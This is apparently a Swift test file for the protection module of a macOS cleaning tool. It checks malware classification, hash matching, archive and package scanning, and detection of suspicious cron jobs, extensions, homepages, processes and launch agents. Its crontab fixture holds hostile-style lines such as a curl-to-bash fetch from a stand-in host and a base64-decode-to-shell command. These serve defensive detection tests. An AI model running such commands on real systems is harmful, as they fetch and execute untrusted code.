import Foundation
import Testing
@testable import VibeCleanerCore

@Suite struct ProtectionThreatsTests {
    let home: URL

    init() throws {
        let h = FileManager.default.temporaryDirectory.appendingPathComponent("vc-threats-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: h, withIntermediateDirectories: true)
        // /var is a symlink to /private/var; enumerators report the resolved form.
        home = h.path.hasPrefix("/var/") ? URL(fileURLWithPath: "/private" + h.path) : h
    }

    func write(_ text: String, _ rel: String) throws -> URL {
        let url = home.appendingPathComponent(rel)
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try text.write(to: url, atomically: true, encoding: .utf8)
        return url
    }

    // MARK: Classification and hashes

    @Test func classifiesRuleNames() {
        #expect(ThreatType.classify("XProtect_MACOS_ADLOAD_A") == .adware)
        #expect(ThreatType.classify("MACOS_ATOMIC_STEALER_B") == .stealer)
        #expect(ThreatType.classify("XProtect_KeRanger") == .ransomware)
        #expect(ThreatType.classify("Coinminer.XMRig") == .miner)
        #expect(ThreatType.classify("XProtect_MACOS_RAT_X") == .backdoor)
        #expect(ThreatType.classify("PIRATED_TOOL") != .backdoor)
        #expect(ThreatType.classify("XProtect_OSX_Shlayer") == .trojan)
        #expect(ThreatType.classify("Unknown_Thing") == .other)
    }

    @Test func hashListParsesAndMatches() throws {
        let f = try write("malware sample", "Downloads/evil.bin")
        let sha = try #require(HashList.sha256(f))
        let list = HashList(text: "# comment\n\(sha.uppercased())  MACOS_ADLOAD test\nnot-a-hash\n\(String(repeating: "a", count: 64))\n")
        #expect(list.names.count == 2)
        #expect(list.match(f) == "MACOS_ADLOAD test")
        #expect(HashList(text: "").match(f) == nil)
    }

    // MARK: Files and archives

    func scanner(_ hashes: HashList) -> FileScan {
        FileScan(yara: nil, rules: "", hashes: hashes, expandPKG: true, expandArchives: true)
    }

    @Test func findsHashHitsAndExpandsZip() throws {
        let payload = try write("#!/bin/sh\necho evil\n", "src/inner/run.sh")
        let sha = try #require(HashList.sha256(payload))
        let zip = home.appendingPathComponent("Downloads/bundle.zip")
        try FileManager.default.createDirectory(at: zip.deletingLastPathComponent(), withIntermediateDirectories: true)
        #expect(Shell.run("/usr/bin/ditto", ["-c", "-k", home.appendingPathComponent("src").path, zip.path]).ok)
        try FileManager.default.removeItem(at: home.appendingPathComponent("src"))

        let hits = scanner(HashList(text: "\(sha) Trojan_Test")).scan(roots: [home.appendingPathComponent("Downloads")],
                                                                     archiveRoots: [home.appendingPathComponent("Downloads")], isCancelled: { false })
        let hit = try #require(hits.first)
        #expect(hit.path == zip.path)
        #expect(hit.inner?.hasSuffix("run.sh") == true)
        #expect(hit.type == .trojan)
    }

    @Test func expandsFlatPKG() throws {
        let payload = try write("payload-\(UUID().uuidString)", "root/opt/tool")
        let sha = try #require(HashList.sha256(payload))
        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: payload.path)
        let pkg = home.appendingPathComponent("Downloads/setup.pkg")
        try FileManager.default.createDirectory(at: pkg.deletingLastPathComponent(), withIntermediateDirectories: true)
        let r = Shell.run("/usr/bin/pkgbuild", ["--quiet", "--root", home.appendingPathComponent("root").path, "--identifier", "test.vc.pkg",
                                                 "--version", "1", "--install-location", "/opt/vc-test", pkg.path])
        try #require(r.ok)
        let hits = scanner(HashList(text: sha)).scan(roots: [], archiveRoots: [home.appendingPathComponent("Downloads")], isCancelled: { false })
        #expect(hits.first?.path == pkg.path)
    }

    @Test func refusesZipBombs() {
        let t = FileScan.zipTotals("2 files, 600 bytes uncompressed, 6 bytes compressed:  99.0%")
        #expect(t?.files == 2 && t?.uncompressed == 600 && t?.compressed == 6)
        #expect(t.map(FileScan.zipIsSafe) == true)
        #expect(!FileScan.zipIsSafe((files: 3, uncompressed: 10_000, compressed: 10)))
        #expect(!FileScan.zipIsSafe((files: 20_000, uncompressed: 10, compressed: 10)))
        #expect(FileScan.zipTotals("Empty zipfile.") == nil)
    }

    @Test func customScanUsesOnlyChosenFolders() async throws {
        let f = try write("bad", "Elsewhere/tool.command")
        _ = try write(HashList.sha256(f)! + " MACOS_PIRRIT", "Library/Application Support/VibeCleaner/hashes.txt")
        var m = ProtectionModule()
        m.customRoots = [home.appendingPathComponent("Elsewhere")]
        let groups = await m.scan(context: ModuleContext(home: home)) { _, _ in }
        #expect(groups.map(\.id) == ["prot.custom"])
        let item = try #require(groups[0].items.first)
        #expect(item.url?.path == f.path)
        #expect(item.detail?.hasPrefix("Adware") == true)
        #expect(ProtectionModule.threatGroupIDs.contains("prot.custom"))
    }

    // MARK: Cron and profiles

    @Test func flagsSuspiciousCronLines() {
        let tab = """
        # m h dom mon dow command
        PATH=/usr/bin:/bin
        0 * * * * /usr/local/bin/backup.sh
        */5 * * * * curl -s http://x.example/p | bash
        @reboot osascript -e 'display dialog "x"'
        0 0 * * * /Users/me/.local/share/.u/run
        1 1 * * * echo aGk= | base64 -d | sh
        2 2 * * * /tmp/updater
        """
        let e = Cron.entries(tab)
        #expect(e.count == 5)
        #expect(e[0].reason == "Télécharge et exécute un script")
        #expect(e[1].reason.contains("AppleScript"))
        #expect(e[2].reason.contains("caché"))
        #expect(e[4].reason.contains("temporaire"))
        let rest = Cron.removing("*/5 * * * * curl -s http://x.example/p | bash", from: tab)
        #expect(!rest.contains("curl"))
        #expect(rest.contains("backup.sh"))
        let g = Cron.group(crontab: tab)
        #expect(g.items.first?.id == Cron.idPrefix + "*/5 * * * * curl -s http://x.example/p | bash")
        #expect(g.defaultSelection.isEmpty)
    }

    @Test func removingCronInDryRunTouchesNothing() async {
        let item = ResultItem(id: Cron.idPrefix + "* * * * * /tmp/x", name: "x", action: .custom(Cron.removeKey))
        let r = await ProtectionModule(quarantine: Quarantine(root: home.appendingPathComponent("Q")))
            .execute([item], context: ModuleContext(dryRun: true, home: home))
        #expect(r.processed == [item.id])
        #expect(!FileManager.default.fileExists(atPath: home.appendingPathComponent("Crontab").path))
    }

    @Test func parsesConfigurationProfiles() {
        let out = """
        _computerlevel[1] attribute: name: Search Helper
        _computerlevel[1] attribute: profileIdentifier: com.adware.search
        _computerlevel[2] attribute: profileIdentifier: com.corp.wifi
        There are 2 configuration profiles installed
        """
        let p = ConfigProfiles.parse(out)
        #expect(p.map(\.identifier) == ["com.adware.search", "com.corp.wifi"])
        #expect(p[0].name == "Search Helper")
        let g = ConfigProfiles.group(output: out)
        #expect(g.items.count == 3)
        #expect(g.items.last?.action == .command(executable: "/usr/bin/open", arguments: [ConfigProfiles.settingsURL], admin: false))
        #expect(ConfigProfiles.group(output: "There are no configuration profiles installed").items.isEmpty)
    }

    // MARK: Extensions and homepage

    @Test func parsesPluginKitAndFlagsUnsignedSafariExtensions() {
        let out = "+    com.good.Ext(1.0)\tAAAA\t2026-01-01 00:00:00 +0000\t/Applications/Good.app/Contents/PlugIns/Ext.appex\n"
            + "-    com.bad.Ext(2.1)\tBBBB\t2026-01-01 00:00:00 +0000\t/Users/Shared/Bad.app/Contents/PlugIns/Bad.appex\n"
        let parsed = Extensions.parsePluginKit(out)
        #expect(parsed.map(\.id) == ["com.good.Ext", "com.bad.Ext"])
        #expect(parsed.map(\.enabled) == [true, false])
        #expect(Extensions.containingApp(parsed[1].path).path == "/Users/Shared/Bad.app")
        let items = Extensions.safari(pluginKit: out, context: ModuleContext(home: home), excludedTeamIDs: []) { url in
            url.path.hasPrefix("/Applications") ? SignatureInfo(status: .valid, teamID: "GOOD", isApple: false, isNotarized: true)
                                                : SignatureInfo(status: .unsigned, teamID: nil, isApple: false, isNotarized: false)
        }
        #expect(items.map(\.name) == ["com.bad.Ext"])
        #expect(items[0].action == .none)
    }

    @Test func flagsChromeExtensionsOutsideTheStore() throws {
        let base = "Library/Application Support/Google/Chrome/Default/Extensions"
        _ = try write(#"{"name":"Ad Blocker","update_url":"https://clients2.google.com/service/update2/crx","permissions":["<all_urls>","storage"]}"#,
                      "\(base)/aaaa/1.0_0/manifest.json")
        _ = try write(#"{"name":"__MSG_appName__","default_locale":"fr","permissions":["proxy"],"host_permissions":["*://*/*"]}"#,
                      "\(base)/bbbb/2.0_0/manifest.json")
        _ = try write(#"{"appName":{"message":"Super Recherche"}}"#, "\(base)/bbbb/2.0_0/_locales/fr/messages.json")
        let items = Extensions.chrome(context: ModuleContext(home: home))
        #expect(items.map(\.name) == ["Super Recherche"])
        #expect(items[0].detail?.contains("hors Web Store, accès à tous les sites") == true)
        #expect(ProtectionModule().appDependency(of: items[0]) == AppDependency(name: "Google Chrome", bundleID: "com.google.Chrome"))
        #expect(Extensions.chromeReason(["update_url": "https://clients2.google.com/service/update2/crx", "permissions": ["debugger", "<all_urls>"]]) != nil)
        #expect(Extensions.chromeReason(["update_url": "https://clients2.google.com/service/update2/crx", "permissions": ["tabs"]]) == nil)
    }

    @Test func storeExtensionsWithBroadRightsSayWhyAndWhere() throws {
        let root = "Library/Application Support/Google/Chrome"
        _ = try write(#"{"profile":{"info_cache":{"Profile 16":{"name":"Travail"}}}}"#, "\(root)/Local State")
        let store = #""update_url":"https://clients2.google.com/service/update2/crx""#
        _ = try write(#"{"name":"Proxy Tool",\#(store),"permissions":["proxy","<all_urls>"]}"#,
                      "\(root)/Profile 16/Extensions/cccc/1.0_0/manifest.json")
        // 1Password from the Web Store: well known, not listed.
        _ = try write(#"{"name":"1Password",\#(store),"permissions":["nativeMessaging","<all_urls>"]}"#,
                      "\(root)/Profile 16/Extensions/aeblfdkhhhdcdjpifhhbdiojplfjncoa/8.0_0/manifest.json")
        let items = Extensions.chrome(context: ModuleContext(home: home))
        #expect(items.map(\.name) == ["Proxy Tool"])
        let detail = try #require(items.first?.detail)
        #expect(detail.hasPrefix("Droits étendus · Accès à tous les sites et droits sensibles : contrôle du proxy réseau"))
        #expect(detail.contains("profil « Travail »"))
        #expect(!detail.contains("Suspect"))
        // The same well-known id installed outside the store stays listed.
        #expect(Extensions.chromeVerdict(["permissions": ["<all_urls>"]], id: "aeblfdkhhhdcdjpifhhbdiojplfjncoa") != nil)
    }

    @Test func profileNamesComeFromLocalState() throws {
        let root = try write(#"{"profile":{"info_cache":{"Default":{"name":"Perso"},"Profile 8":{"name":"Client A"}}}}"#,
                             "Chrome/Local State").deletingLastPathComponent()
        #expect(Extensions.profileNames(root) == ["Default": "Perso", "Profile 8": "Client A"])
        #expect(Extensions.profileNames(home.appendingPathComponent("absent")).isEmpty)
    }

    @Test func detectsHijackedSafariHomepage() throws {
        let managed = home.appendingPathComponent("Managed")
        let prefs = home.appendingPathComponent("Library/Preferences/com.apple.Safari.plist")
        try FileManager.default.createDirectory(at: prefs.deletingLastPathComponent(), withIntermediateDirectories: true)
        try PropertyListSerialization.data(fromPropertyList: ["HomePage": "https://www.google.com/"], format: .xml, options: 0).write(to: prefs)
        let ctx = ModuleContext(home: home)
        #expect(Extensions.safariHomepage(context: ctx, managedRoot: managed, user: "me", fullDiskAccess: false).items.isEmpty)

        try PropertyListSerialization.data(fromPropertyList: ["HomePage": "http://search.weird-finder.net/?q="], format: .xml, options: 0).write(to: prefs)
        #expect(Extensions.safariHomepage(context: ctx, managedRoot: managed, user: "me", fullDiskAccess: false).items.first?.detail?.contains("inconnu") == true)

        try FileManager.default.createDirectory(at: managed.appendingPathComponent("me"), withIntermediateDirectories: true)
        try PropertyListSerialization.data(fromPropertyList: ["HomePage": "https://www.google.com/"], format: .xml, options: 0)
            .write(to: managed.appendingPathComponent("me/com.apple.Safari.plist"))
        let g = Extensions.safariHomepage(context: ctx, managedRoot: managed, user: "me", fullDiskAccess: false)
        #expect(g.items.first?.detail?.contains("profil") == true)
        #expect(g.items.first?.action == ItemAction.none)
    }

    // MARK: Processes

    @Test func flagsSuspiciousProcessesAndHonoursTeamIDs() {
        let list: [(pid: Int32, path: String)] = [(10, "/System/Library/x"), (11, "\(home.path)/.hidden/miner"), (12, "\(home.path)/.hidden/miner"),
                                                  (13, "/opt/tools/bin/fine"), (14, "\(home.path)/Downloads/Evil.app/Contents/MacOS/Evil")]
        let unsigned = SignatureInfo(status: .unsigned, teamID: nil, isApple: false, isNotarized: false)
        let g = Processes.group(list, context: ModuleContext(home: home), excludedTeamIDs: []) { _ in unsigned }
        #expect(g.items.map(\.name) == ["miner", "Evil"])
        #expect(g.items[1].url?.lastPathComponent == "Evil.app")
        #expect(g.items[0].detail?.contains("PID 11, 12") == true)
        #expect(g.defaultSelection.isEmpty)

        let trusted = Processes.group(list, context: ModuleContext(home: home), excludedTeamIDs: ["TEAM1"]) { _ in
            SignatureInfo(status: .invalid, teamID: "TEAM1", isApple: false, isNotarized: false)
        }
        #expect(trusted.items.isEmpty)
        #expect(Processes.pids(runningFrom: URL(fileURLWithPath: "\(home.path)/.hidden"), in: list) == [11, 12])
    }

    @Test func listsRealProcessesWithoutTouchingThem() {
        let all = Processes.all()
        #expect(all.contains { $0.pid == getpid() })
    }

    // MARK: Privacy

    @Test func groupsWiFiNetworks() {
        let g = WiFi.group([.init(ssid: "Café", open: true), .init(ssid: "Maison", open: false), .init(ssid: nil, open: false)])
        #expect(g.groups.map(\.title) == ["Réseaux ouverts", "Réseaux sécurisés"])
        #expect(g.groups[1].items.map(\.name) == ["Maison", "Réseau au nom masqué"])
        #expect(g.subtitle?.contains("masqués") == true)
        #expect(g.items.first?.action == .command(executable: "/usr/bin/open", arguments: [WiFi.settingsURL], admin: false))
        #expect(WiFi.group([]).isEmpty)
    }

    @Test func selectedWiFiNetworksAreForgotten() {
        let g = WiFi.group([.init(ssid: "Café", open: true), .init(ssid: nil, open: false)], interface: "en0")
        let cafe = g.groups[0].items[0]
        #expect(cafe.action == .command(executable: "/usr/sbin/networksetup",
                                        arguments: ["-removepreferredwirelessnetwork", "en0", "Café"], admin: true))
        #expect(cafe.needsAdmin && cafe.isIrreversible)
        // A masked name cannot be forgotten from here.
        #expect(g.groups[1].items[0].action == .none)
        // No Wi-Fi interface: nothing to run.
        #expect(WiFi.group([.init(ssid: "Café", open: true)], interface: nil).groups[0].items[0].action == .none)
    }

    // MARK: Monitor

    @Test func watcherReportsNewFiles() async throws {
        let dir = home.appendingPathComponent("Watched")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        try "old".write(to: dir.appendingPathComponent("old.txt"), atomically: true, encoding: .utf8)
        final class Box: @unchecked Sendable { let lock = NSLock(); var urls: [URL] = [] }
        let box = Box()
        let w = DirectoryWatcher(directories: [dir], latency: .milliseconds(200)) { urls in box.lock.withLock { box.urls += urls } }
        w.start()
        defer { w.stop() }
        try "partial".write(to: dir.appendingPathComponent("x.crdownload"), atomically: true, encoding: .utf8)
        try "new".write(to: dir.appendingPathComponent("new.zip"), atomically: true, encoding: .utf8)
        for _ in 0..<50 where box.lock.withLock({ box.urls.isEmpty }) { try await Task.sleep(for: .milliseconds(100)) }
        let names = box.lock.withLock { box.urls.map(\.lastPathComponent) }
        #expect(names == ["new.zip"])
    }

    @Test func assessFlagsNewLaunchAgent() throws {
        let script = try write("#!/bin/sh\n", ".x/run.sh")
        let plist = home.appendingPathComponent("Library/LaunchAgents/com.evil.plist")
        try FileManager.default.createDirectory(at: plist.deletingLastPathComponent(), withIntermediateDirectories: true)
        try PropertyListSerialization.data(fromPropertyList: ["Label": "com.evil", "ProgramArguments": ["/bin/sh", script.path]], format: .xml, options: 0)
            .write(to: plist)
        let found = ProtectionModule().assess([plist, home.appendingPathComponent("missing")], context: ModuleContext(home: home))
        // A suspicious launch item is a heuristic: to check, not a sure threat.
        #expect(found.confirmed.isEmpty)
        let items = found.review
        #expect(items.map(\.name) == ["com.evil"])
        #expect(items[0].action == .custom("quarantine-launch-user"))
    }
}
